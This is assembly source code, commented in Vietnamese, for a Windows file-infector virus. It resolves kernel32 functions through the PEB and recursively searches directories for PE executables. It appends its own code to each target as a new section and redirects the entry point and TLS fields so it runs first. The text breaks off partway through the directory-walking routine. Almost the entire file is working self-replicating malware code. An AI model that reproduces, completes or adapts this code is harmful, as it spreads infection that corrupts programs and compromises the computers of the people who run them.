.386
.model flat, stdcall
option casemap:none
ASSUME FS:NOTHING

.code
start:

call lap
lap:
pop 	ebp
sub		ebp, offset lap
push	ebp					;+

xor		eax, eax
mov		eax, fs:[030h]
mov		eax, [eax + 0ch]
mov		eax, [eax + 0ch]
mov		eax, [eax + 00h]
mov		eax, [eax + 00h]
mov		eax, [eax + 18h]
mov		ebx, eax
push	ebx					;+

add		eax, 3ch
mov		ecx, dword ptr [eax]
sub		eax, 3ch
add		eax, ecx
add		eax, 78h
mov		ecx, dword ptr [eax]
add		ecx, ebx
push	ecx					;+

add		ecx, 20h
mov		ecx, dword ptr [ecx]
add		ecx, ebx

mov		edx, ecx

pop		ecx					;-
pop		ebp					;-
pop		eax					;-

push	ecx
push	ebp
xor		ebx, ebx
xor		ecx, ecx
mov		ecx, 0fh
loop_find_getproc:
cld
mov		esi, offset getprocaddress
add		esi, eax	
mov		edi, [edx+ ebx]
add		edi, ebp
mov		ecx, 0fh
add		ebx, 4
repe	cmpsb
jne		loop_find_getproc

pop		edx
pop 	ecx
push	eax
push	ecx

sub		ebx, 4
shr		ebx, 1

add		ecx, 24h
mov		ecx, dword ptr [ecx]
add		ecx, ebx

add		ecx, edx
mov		cx, word ptr [ecx]

xor 	eax, eax
mov		ax, cx
pop		ecx
push	ecx
add		ecx, 1ch
mov		ecx, dword ptr [ecx]
imul	eax, 4h
add		ecx, eax
add		ecx, edx
mov		eax, dword ptr [ecx]
add		eax, edx
pop		ebx
pop		ebx

push	ebx			;delta
push	edx			;hmodule
push	eax			;getprocaddress

pop		eax
pop		edx
pop		ebx
push	ebx
push	edx
push	eax

mov		ecx, offset virtualprotect
add		ecx, ebx

push	ecx
push	edx
call	eax

;cap quyen rwx
call	get
get:
pop		ebp
push	ebp
push	esp
push	40h
push	1000h
push	ebp
call	eax

pop		ecx			;old
pop		eax			;gpa
pop		edx			;hmodule
pop		ebp			;delta

;mov		[offset kernel32 + ebp], edx
lea		ebx, kernel32
add		ebx, ebp
mov		[ebx], edx
;mov		[offset gpa + ebp], eax
lea		ebx, gpa
add		ebx, ebp
mov		[ebx], eax
;mov		[offset old + ebp], ecx
lea		ebx, old
add		ebx, ebp
mov		[ebx], ecx
;mov		[offset delta + ebp], ebp
lea		ebx, delta
add		ebx, ebp
mov		[ebx], ebp

;Lay ham LoadLibraryA
mov		eax, offset loadlib
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset load
add		ecx, ebp
mov		[ecx], eax


;Lay ham FindFirstFile
mov		eax, offset findfirstfile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset fff
add		ecx, ebp
mov		[ecx], eax

;Lay ham FindNextFile
mov		eax, offset findnextfile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset fnf
add		ecx, ebp
mov		[ecx], eax

;Lay ham RtlZeroMemory
mov		eax, offset memsetzero
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset msz
add		ecx, ebp
mov		[ecx], eax

;Lay ham VirtualAlloc
mov		eax, offset viralloc
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset virAlloc
add		ecx, ebp
mov		[ecx], eax

;Lay ham VirtualFree
mov		eax, offset virfree
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset virFree
add		ecx, ebp
mov		[ecx], eax

;Lay ham CreateFile
mov		eax, offset createfile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset cf
add		ecx, ebp
mov		[ecx], eax

;Lay ham ReadFile
mov		eax, offset readfile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset rf
add		ecx, ebp
mov		[ecx], eax

;Lay ham WriteFile
mov		eax, offset writefile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset wf
add		ecx, ebp
mov		[ecx], eax

;Lay ham lstrlen
mov		eax, offset len
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset strlen
add		ecx, ebp
mov		[ecx], eax

;Lay ham lstrcpy
mov		eax, offset cpy
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset strcpy
add		ecx, ebp
mov		[ecx], eax

;Lay ham CloseHandle
mov		eax, offset clshandle
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset clh
add		ecx, ebp
mov		[ecx], eax

;Lay ham exit
mov		eax, offset exit
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset exitprocess
add		ecx, ebp
mov		[ecx], eax

;Lay ham GetModuleFileName
mov		eax, offset getpathfile
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset gmfn
add		ecx, ebp
mov		[ecx], eax

;goi user32.dll

mov		eax, offset lib_user32
add		eax, ebp
mov		ecx, offset load
add		ecx, ebp
mov		ecx, [ecx]

push	eax
call	ecx

mov		ecx, offset user32
add		ecx, ebp
mov		[ecx], eax

;lay ham MessageBox

mov		eax, offset messagebox
add		eax, ebp
mov		ebx, offset user32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset mg
add		ecx, ebp
mov		[ecx], eax


;Lay ham GetCurrentDirectoryA

mov		eax, offset getpath
add		eax, ebp
mov		ebx, offset kernel32
add		ebx, ebp
mov		ebx, [ebx]
mov		ecx, offset gpa
add		ecx, ebp
mov		ecx, [ecx]

push	eax
push	ebx
call	ecx

mov		ecx, offset gcd
add		ecx, ebp
mov		[ecx], eax



lea		eax, path
add		eax, ebp
lea		ebx, gcd
add		ebx, ebp
mov		ebx, [ebx]
push	eax					;path
push	256					;size
call	ebx			;GetCurrentDirectoryA

lea		ecx, path
add		ecx, ebp

xor		ebx, ebx
mov		ebx, offset delta 
add		ebx, ebp
mov		ebx, [ebx]
;-----------------------------------------------------------------------------
push	ebx
push	ecx								
call	browse_files
;------------------------------------------------------------------------------

lea		eax, mg
add		eax, ebp
mov		eax, [eax]
mov		ebx, offset tit
add		ebx, ebp
push	0
push	0
push	ebx
push	0
call	eax

	
;--------------------------------------------
mov		eax, offset file_name
add		eax, ebp
mov		ebx, offset gmfn
add		ebx, ebp
mov		ebx, [ebx]

push	262
push	eax
push	0
call	ebx

;---------------------------------------------
mov		eax, offset file_name
add		eax, ebp
mov		ebx, offset cf
add		ebx, ebp
mov		ebx, [ebx]

push	0
push	80h					;normal
push	3					;OPEN_EXISTING
push	0
push	00000001h			;read 
push	080000000h			;read 
push	eax					;pathtmp
call	ebx					;CreateFile	

lea		ebx, h_file
add		ebx, ebp
mov		[ebx], eax

;e_lfanew-----------------------------------------
lea		edx, ovl_g
add		edx, ebp
add		edx, 8
mov		dword ptr [edx], 60

mov		eax, offset tmp_1
add		eax, ebp
mov		ebx, offset rf
add		ebx, ebp
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, ebp
mov		ecx, [ecx]
lea		edx, ovl_g
add		edx, ebp

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx

mov		eax, offset tmp_1
add		eax, ebp
mov		eax, [eax]
add		eax, 34h

;imagebase-----------------
lea		edx, ovl_g
add		edx, ebp
add		edx, 8
mov		dword ptr [edx], eax

mov		eax, offset tmp_2
add		eax, ebp
mov		ebx, offset rf
add		ebx, ebp
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, ebp
mov		ecx, [ecx]
lea		edx, ovl_g
add		edx, ebp

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx

;TLS size------------------
mov		eax, offset tmp_1
add		eax, ebp
mov		eax, [eax]
add		eax, 0c4h

lea		edx, ovl_g
add		edx, ebp
add		edx, 8
mov		dword ptr [edx], eax

mov		eax, offset tmp_3
add		eax, ebp
mov		ebx, offset rf
add		ebx, ebp
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, ebp
mov		ecx, [ecx]
lea		edx, ovl_g
add		edx, ebp

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx
;----------------------
mov		eax, offset clh
add		eax, ebp
mov		eax, [eax]

lea		ebx, h_file
add		ebx, ebp
mov		ebx, [ebx]
push	ebx
call	eax

;-----------------------
lea		eax, tmp_2
add		eax, ebp
mov		eax, [eax]

lea		ebx, tmp_3
add		ebx, ebp
mov		ebx, [ebx]
add		eax, ebx
cmp		ebx, 0ffffffffh
je		file_virus
jmp		eax
file_virus:
lea		eax, exitprocess
add		eax, ebp
mov		eax, [eax]
xor		ebx, ebx

push	0
call	eax
;---------------------------------------------------------------------
inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
	
	LOCAL path_file_current[262]:byte
	LOCAL inject_tmp:dword
	LOCAL this_file_virus_handle:dword
	LOCAL ov[5]:dword
	LOCAL numberofsection:word
	LOCAL nos_injected:word
	LOCAL aop_virus:dword
	LOCAL aop_injected:dword
	LOCAL anew:dword
	LOCAL section[10]:dword
	LOCAL section_final[10]:dword
	LOCAL delta_aop:dword
	LOCAL injected:dword
	LOCAL sec_align:dword
	LOCAL file_align:dword
	LOCAL imagesz:dword
	LOCAL aop:dword
	LOCAL tmp_4:dword
	
	
	xor		eax, eax
	lea		eax, path_file_current
	
	mov		ebx, del
	add		ebx, offset gmfn
	mov		ebx, [ebx]
	
	push	262
	push	eax
	push	0
	call	ebx			;getmodulefilenamea
	
	cmp		eax, 0
	je		end_inject_file
	
	xor		eax, eax
	lea		eax, path_file_current
	
	mov		ebx, del
	add		ebx, offset cf
	mov		ebx, [ebx]
	
	push	0
	push	80h					;normal
	push	3					;OPEN_EXISTING
	push	0
	push	00000007h			;read va write
	push	080000000h			;read
	push	eax					;pathtmp
	call	ebx					;CreateFile
	
	
	cmp 	eax, 0ffffffffh
	je		end_inject_file
	lea		ecx, this_file_virus_handle
	mov		[ecx], eax
	;...
	xor		ebx, ebx
	mov		eax, del
	add		eax, offset msz
	mov		eax, [eax]
	mov		ebx, 14h
	lea		ecx, ov

	push	ebx			;size
	push	ecx			;buff
	call 	eax			;call RtlZeroMemory
	;...
	xor		ebx, ebx
	mov		ebx, 60
	
	lea		eax, ov
	add		eax, 8h
	mov		dword ptr [eax], ebx
	
	;read e_lfanew
	lea		ebx, ov
	lea		ecx, inject_tmp
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	lea		eax, this_file_virus_handle
	mov		eax, [eax]
	
	push	ebx
	push	0
	push	4							;4 byte
	push	ecx							;buffer
	push	eax							;handle
	call	edx 						;ReadFile
	
	;...
	xor		ebx, ebx
	mov		eax, del
	add		eax, offset msz
	mov		eax, [eax]
	mov		ebx, 14h
	lea		ecx, ov

	push	ebx			;size
	push	ecx			;buff
	call 	eax			;call RtlZeroMemory
	;...
	mov		ebx, inject_tmp
	
	lea		eax, ov
	add		eax, 8h
	add		ebx, 6h					
	mov		dword ptr [eax], ebx
	
	;read numberofsection
	lea		ebx, ov
	lea		ecx, numberofsection
	
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	lea		eax, this_file_virus_handle
	mov		eax, [eax]
	
	push	ebx
	push	0
	push	2							;4 byte
	push	ecx							;buffer
	push	eax							;handle
	call	edx							;ReadFile
	
	;...
	xor		ebx, ebx
	mov		eax, del
	add		eax, offset msz
	mov		eax, [eax]
	mov		ebx, 14h
	lea		ecx, ov

	push	ebx			;size
	push	ecx			;buff
	call 	eax			;call RtlZeroMemory
	;...
	
	mov		ebx, inject_tmp
	
	lea		eax, ov
	add		eax, 8h
	add		ebx, 28h					
	mov		dword ptr [eax], ebx
	
	;read AddressOfEntryPoint
	lea		ebx, ov
	lea		ecx, aop_virus
	
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	4							;4 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	
	xor		edx, edx
	xor 	ecx, ecx
	mov		cx, numberofsection
	mov		edx, inject_tmp
	add		edx, 0f8h
	
	find_section:
	
	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], edx
	push	ecx
	push	edx
	;read section
	lea		ebx, ov
	lea		ecx, section

	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	40							;40 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	
	
	mov		eax, [section+0ch]
	mov		ebx, aop_virus
	pop		edx
	pop		ecx
	cmp		eax, ebx
	ja		finded
	cmp		eax, 0
	je		finded
	add		edx, 40
	dec		ecx
	jmp		find_section
	finded:
	
	sub		edx, 40
	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], edx
	
	lea		ebx, ov
	lea		ecx, section
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	40							;40 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx 						;ReadFile section exec in section table
	
	mov		eax, [section+0ch]
	mov		ebx, aop_virus
	sub		ebx, eax
	mov		delta_aop, ebx
	
	mov		eax, [section+10h]
	lea		ebx, raw_size
	add		ebx, del
	mov		[ebx], eax

	mov		eax, [section+14h]
	lea		ebx, raw_virus
	add		ebx, del
	mov		[ebx], eax
	
	;readfile injected

	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], 60
	
	lea		ebx, ov
	lea		ecx, injected
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	4							;4 byte
	push	ecx							;buffer
	push	handleF						;handle
	call	edx							;ReadFile e_lfanew
	
	;doc filealignment va sectionalignment
	
	xor		eax, eax
	mov		eax, injected
	add		eax, 38h
	
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]			; readfile
	
	lea		ebx, ov
	add		ebx, 8
	mov		[ebx], eax
	lea		ebx, ov
	lea		eax, sec_align
	
	push	ebx
	push 	0
	push	4
	push	eax
	push	handleF
	call	edx					;read sectionalignment
	
	
	
	
	xor		eax, eax
	mov		eax, injected
	add		eax, 3ch
	
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]			; readfile
	
	
	lea		ebx, ov
	add		ebx, 8
	mov		[ebx], eax
	lea		ebx, ov
	lea		eax, file_align
	
	push	ebx
	push 	0
	push	4
	push	eax
	push	handleF
	call	edx					;readfile filealignment
	
	;doc so section cua file bi lay
	
	
	mov		ebx, injected
	lea		eax, ov
	add		eax, 8h	
	add		ebx, 6				
	mov		dword ptr [eax], ebx
	
	lea		ebx, ov
	lea		ecx, nos_injected
	
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	2							;2 byte
	push	ecx							;buffer
	push	handleF						;handle
	call	edx							;ReadFile numberofsection
	
	
	;doc thong tin section cuoi trong sectiontable
	
	
	xor		eax, eax
	mov		ax, nos_injected
	dec		ax
	mov		cl, 28h
	mul		cl	
	
	xor		ecx, ecx
	mov		ecx, injected
	add		ecx, 0f8h
	add		ecx, eax
	
	
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]			; readfile
	
	
	lea		ebx, ov
	add		ebx, 8
	mov		[ebx], ecx
	lea		ebx, ov
	lea		eax, section_final
	
	push	ebx
	push 	0
	push	28h
	push	eax
	push	handleF
	call	edx					;read sectionalignment
	
	
	
	;Doc AddressOfEntryPoint cua file bi lay

	xor 	eax, eax
	mov		eax, injected
	add		eax, 28h
	
	lea		ebx, rf
	add		ebx, del
	mov		ebx, [ebx]
	
	
	lea		ecx, ov
	add		ecx, 8
	mov		dword ptr [ecx], eax
	lea		ecx, ov
	
	lea		edx, aop_injected
	
	push	ecx
	push 	0
	push	4
	push	edx
	push	handleF
	call	ebx				;readfile addressofentrypoint cua file bi lay
	
	
	;chinh thong tin section chua virus truoc khi lay
	
	lea		eax, section_final
	add		eax, 10h
	
	mov		ebx, dword ptr [eax]
	add		eax, 4
	mov		eax, dword ptr [eax]
	add		ebx, eax
	
	mov		ecx, file_align
	raw_address:
	add		eax, ecx
	cmp		eax, ebx
	jae		done_raw_address
	jmp		raw_address
	
	done_raw_address:
	lea		ebx, section
	add		ebx, 14h
	mov		dword ptr [ebx], eax	;sua raw address
	
	lea		ebx, raw_injected
	add		ebx, del
	mov		[ebx], eax
	;-----------------
	lea		eax, section_final
	add		eax, 8h
	
	mov		ebx, dword ptr [eax]
	add		eax, 4h
	mov		eax, dword ptr [eax]
	add		ebx, eax
	
	mov		ecx, sec_align
	vir_address:
	add		eax, ecx
	cmp		eax, ebx
	jae		done_vir_address
	jmp		vir_address
	
	done_vir_address:
	lea		ebx, section
	add		ebx, 0ch
	mov		dword ptr [ebx], eax	;sua virtual address
	
	;ghi them section vua sua vao cuoi bang section
	xor		ebx, ebx
	xor		eax, eax
	mov		bx, nos_injected
	mov		al, 28h
	mul		bx
	
	mov		ebx, eax
	xor		eax, eax
	mov		eax, injected
	add		eax, 0f8h
	add		eax, ebx
	
	lea		edx, wf
	add		edx, del
	mov		edx, [edx]			; writefile

	lea		ebx, ov
	add		ebx, 8
	mov		[ebx], eax
	lea		ebx, ov
	lea		eax, section
	
	push	ebx
	push 	0
	push	28h
	push	eax
	push	handleF
	call	edx					;writefile imagesize
	
	
	;Sua numberofsection
	xor		eax, eax
	mov		ax, nos_injected
	inc		ax
	mov		nos_injected, ax			;tang section len 1
	
	lea		edx, wf
	add		edx, del
	mov		edx, [edx]
	
	mov		ebx, injected
	lea		eax, ov
	add		eax, 8h	
	add		ebx, 6				
	mov		dword ptr [eax], ebx
	
	lea		ebx, ov
	lea 	ecx, nos_injected
	
	push 	ebx
	push	0
	push	2
	push	ecx
	push	handleF
	call	edx							;writefile sua numberofsection
	
	;lay sizeofimage
	
	lea		ebx, section
	add		ebx, 8h
	
	mov		eax, [ebx]
	add		ebx, 4
	mov		ebx, [ebx]
	add		eax, ebx
	
	mov		ecx, sec_align
	image_sz:
	add		ebx, ecx
	cmp 	ebx, eax
	jb		image_sz
	lea		eax, imagesz
	mov		[eax], ebx
	
	;sua image size
	xor		eax, eax
	mov		eax, injected
	add		eax, 50h
	
	lea		edx, wf
	add		edx, del
	mov		edx, [edx]			; writefile
	
	lea		ebx, ov
	add		ebx, 8
	mov		[ebx], eax
	lea		ebx, ov
	lea		eax, imagesz
	
	push	ebx
	push 	0
	push	4
	push	eax
	push	handleF
	call	edx					;writefile imagesize
	
	
	;ghi addressofentrypoint moi
	lea		eax, section
	add		eax, 0ch
	mov		ebx, [eax]
	add		ebx, delta_aop
	
	lea		eax, aop
	mov		[eax], ebx
	
	xor 	eax, eax
	mov		eax, injected
	add		eax, 28h
	
	lea		ebx, wf
	add		ebx, del
	mov		ebx, [ebx]
	
	lea		ecx, ov
	add		ecx, 8
	mov		dword ptr [ecx], eax
	lea		ecx, ov
	
	lea		edx, aop
	
	push	ecx
	push 	0
	push	4
	push	edx
	push	handleF
	call	ebx				;writefile addressofentrypoint cua file bi lay
	
	;sua tls 
	xor		ebx, ebx
	lea		eax, tmp_4
	mov		[eax], ebx
	xor 	eax, eax
	mov		eax, injected
	add		eax, 0c0h
	
	lea		ebx, wf
	add		ebx, del
	mov		ebx, [ebx]
	
	lea		ecx, ov
	add		ecx, 8
	mov		dword ptr [ecx], eax
	lea		ecx, ov
	lea		edx, tmp_4
	
	push	ecx
	push 	0
	push	4
	push	edx
	push	handleF
	call	ebx	
	
	;sua tls size
	
	xor 	eax, eax
	mov		eax, injected
	add		eax, 0c4h
	
	lea		ebx, wf
	add		ebx, del
	mov		ebx, [ebx]
	
	lea		ecx, ov
	add		ecx, 8
	mov		dword ptr [ecx], eax
	lea		ecx, ov
	lea		edx, aop_injected
	
	push	ecx
	push 	0
	push	4
	push	edx
	push	handleF
	call	ebx					;writefile
	
	;Them Section vao cuoi file
	
	lea		eax, raw_size
	add		eax, del
	mov		eax, dword ptr [eax]
	add		eax, 0100h
	lea		ebx, virAlloc
	add		ebx, del
	mov		ebx, [ebx]
	
	push	04h
	push	03000h
	push	eax
	push	0
	call	ebx					;cap phat bo nho de doc code thuc thi
	
	lea		ebx,tmp_9
	add		ebx, del
	mov		[ebx], eax			;luu dia chi duoc cap phat
	mov		ebx, eax
	lea		eax, ov
	lea		ecx, raw_size
	add		ecx, del
	mov		ecx, [ecx]
	
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	add		eax, 08h
	lea		edi, raw_virus
	add		edi, del
	mov		edi, [edi]
	mov		[eax], edi	
	lea		eax, ov
	
	
	push	eax
	push	0
	push	ecx							;raw size byte
	push	ebx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	;doc du lieu thuc thi vao vung nho duoc cap phat
	
	
	
	lea		ebx, wf
	add		ebx, del
	mov		ebx, [ebx]
	
	lea		ecx, raw_size
	add		ecx, del
	mov		ecx, [ecx]
	
	lea		eax,tmp_9
	add		eax, del
	mov		eax, [eax]
	
	lea		edx, ov
	add		edx, 08h
	
	lea		edi, raw_injected
	add		edi, del
	mov		edi, [edi]
	mov		[edx], edi
	
	lea 	edx, ov
	
	push	edx
	push 	0
	push	ecx
	push	eax
	push	handleF
	call	ebx	
	
	
	end_inject_file:
	ret

inject_file endp


;-----------------------------------------------------------------------

browse_files PROC uses eax ebx ecx edx, pathFile:dword, del:dword

	LOCAL hfind:dword
	LOCAL pathtmp[262]:byte
	LOCAL tmp_5:dword
	LOCAL tmp_6:dword
	LOCAL ovl[5]:dword

find_first_file:

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 20
lea		ecx, ovl

push	ebx			;size
push	ecx			;buff
call 	eax			;call RtlZeroMemory


xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 262
lea		ecx, pathtmp

push	ebx			;size
push	ecx			;buff
call 	eax			;call RtlZeroMemory

mov		ebx, del
add		ebx, offset strcpy
mov		ebx, [ebx]
mov		ecx, pathFile		
lea		edx, pathtmp
push	ecx					;pathFile
push	edx					;pathtmp
call	ebx					;call lstrcpy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]
lea		edx, pathtmp

push	edx					;pathtmp
call	eax					;call lstrlen

lea		ebx, pathtmp
add		ebx, eax
mov		al, 5ch
mov		[ebx], al
inc		ebx
mov		al, 2ah
mov		[ebx], al

mov		ecx, del
add		ecx, offset fff
mov		eax, [ecx]

lea		ebx, pathtmp

mov		ecx, del
add		ecx, offset dwFileAttributes


push	ecx			;WIN32_FIND_DATAA
push	ebx			;pathFile
call 	eax			;FindFirstFile

cmp		eax, 0ffffffffh
jz		done_find

lea		ecx, hfind
mov		[ecx], eax


find_next_file:

;check folder

mov		ecx, del
add		ecx, offset dwFileAttributes
mov		ecx, [ecx]
test	ecx, 10h
jnz		check_home	;folder thi check . va .., khong thi tim file thuc thi de lay


;check file thuc thi de lay file

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]

lea		ebx, pathtmp
push	ebx					;string
call 	eax					;call lstrlen

dec		eax
mov		ebx, del
add		ebx, offset strcpy 
mov		ebx, [ebx]
lea		ecx, pathtmp
add		ecx, eax
mov		edx, del
add		edx, offset cFileName
		
push	edx					;cFileName
push	ecx					;pathtmp[eax]
call	ebx					;call lstrcpy

lea		eax, pathtmp

mov		ebx, del
add		ebx, offset cf
mov		ebx, [ebx]

push	0
push	80h					;normal
push	3					;OPEN_EXISTING
push	0
push 	3
push 	0C0000000h
push	eax					;pathtmp
call	ebx					;CreateFile

mov		ebx, del
add		ebx, offset h_file
mov		[ebx], eax	

mov		eax, del
add		eax, offset tmp

mov		ebx, del
add		ebx, offset rf
mov		ebx, [ebx]

mov		ecx, del
add		ecx, offset h_file
mov		ecx, [ecx]

push	0
push	0
push	4
push	eax
push	ecx
call	ebx			;ReadFile

xor		eax, eax
mov		eax, del
add		eax, offset tmp
mov		eax, [eax]
;so sanh MZ
cmp		ax, 5a4dh

jne		close_handle

;e_lfanew------------------------------------------

lea		edx, ovl
add		edx, 8
mov		dword ptr [edx], 60

lea		eax, tmp_5
mov		ebx, offset rf
add		ebx, del
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, del
mov		ecx, [ecx]
lea		edx, ovl

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx
;tls directory rva----------------------------------------
mov		eax, tmp_5
add		eax, 0c0h

lea		edx, ovl
add		edx, 8
mov		dword ptr [edx], eax

lea		eax, tmp_6
mov		ebx, offset rf
add		ebx, del
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, del
mov		ecx, [ecx]
lea		edx, ovl

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx
;tls directory size----------------------------------------------

mov		eax, tmp_5
add		eax, 0c4h

lea		edx, ovl
add		edx, 8
mov		dword ptr [edx], eax

lea		eax, tmp_5
mov		ebx, offset rf
add		ebx, del
mov		ebx, [ebx]

mov		ecx, offset h_file
add		ecx, del
mov		ecx, [ecx]
lea		edx, ovl

push	edx
push	0
push	4
push	eax	
push	ecx
call	ebx
;kiem tra neu car RVA va Size cung = 0 thi lay neu k thi bo qua---------------------------------
xor		eax, eax
mov		eax, tmp_6
cmp		eax, 0
je		check_size
jne		continue_inject
check_size:

xor		eax, eax
mov		eax, tmp_5
cmp		eax, 0

jne		close_handle
continue_inject:
mov		ebx, del
add		ebx, offset h_file
mov		ebx,[ebx]


push	del
push	ebx
call 	inject_file



close_handle:

mov		ebx, del
add		ebx, offset h_file
mov		ebx, [ebx]
mov		ecx, del
add		ecx, offset clh
mov		ecx, [ecx]
push	ebx						;h_file
call	ecx						;closehandle

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 262
lea		ecx, pathtmp

push	ebx			;size
push	ecx			;buff
call 	eax			;call RtlZeroMemory

mov		ebx, del
add		ebx, offset strcpy
mov		ebx, [ebx]
mov		ecx, pathFile		
lea		edx, pathtmp
push	ecx					;pathFile
push	edx					;pathtmp
call	ebx					;call lstrcpy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]
lea		edx, pathtmp

push	edx
call	eax

lea		ebx, pathtmp
add		ebx, eax
mov		al, 5ch
mov		[ebx], al
inc		ebx
mov		al, 2ah
mov		[ebx], al

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]

mov		ecx, del
add		ecx, offset tmp
mov		ebx, 4

push	ebx			;size
push	ecx			;buff
call 	eax			;call RtlZeroMemory

jmp		next_file

;check folder . va ..
check_home:
mov		ebx, del
add		ebx, offset cFileName
mov		al, byte ptr [ebx]

cmp		al, 2eh
je		next_file		;neu la . va .. thi bo qua de FindNextFile neu khong thi check junction


;check junction
check_junction:
test	ecx, 400h
jnz		next_file		;neu la junction thi bo qua de FindNextFile neu khong thi de quy duyet trong folder


;xu ly path de de quy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]

lea		ebx, pathtmp
push	ebx					;string
call 	eax					;call lstrlen

dec		eax
mov		ebx, del
add		ebx, offset strcpy
mov		ebx, [ebx]
lea		ecx, pathtmp
add		ecx, eax
mov		edx, del
add		edx, offset cFileName		

push	edx					;pathtmp[eax]
push	ecx					;cFileName
call	ebx					;call lstrcpy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]
xor		eax, eax
mov		eax, del
lea		ebx, pathtmp

push	eax
push	ebx
call	browse_files


;------------------

next_file:

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 140h
mov		ecx, del
add		ecx, offset dwFileAttributes

push	ebx			;buff
push	ecx			;size
call 	eax			;call RtlZeroMemory

mov		eax, del
add		eax, offset fnf
mov		eax, [eax]
mov		ebx, hfind

mov		ecx, del
add		ecx, offset dwFileAttributes		

push	ecx			;win32_find_data
push	ebx			;hfind
call 	eax			;call FindNextFile

cmp		eax, 0h
jbe		done_find
